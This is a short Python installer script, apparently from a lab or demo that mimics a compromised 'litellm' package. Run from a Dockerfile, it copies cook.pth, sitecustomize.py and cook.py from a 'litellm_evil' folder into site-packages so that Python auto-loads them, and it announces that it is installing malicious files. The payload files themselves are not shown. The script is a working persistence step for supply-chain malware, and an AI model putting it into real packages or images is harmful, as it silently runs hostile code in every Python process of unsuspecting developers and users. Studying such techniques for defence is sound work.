"""
install.py — copies cook.pth and sitecustomize.py directly into
the Python site-packages directory so Python auto-loads them.

Called from the Dockerfile after pip install.
"""
import site, shutil, os

sp = site.getsitepackages()[0]
print(f"Installing malicious files into {sp}")

here = os.path.dirname(os.path.abspath(__file__))

for fname in ("cook.pth", "sitecustomize.py", "cook.py"):
    src = os.path.join(here, "litellm_evil", fname)
    dst = os.path.join(sp, fname)
    shutil.copy(src, dst)
    print(f"  copied {fname} -> {dst}")
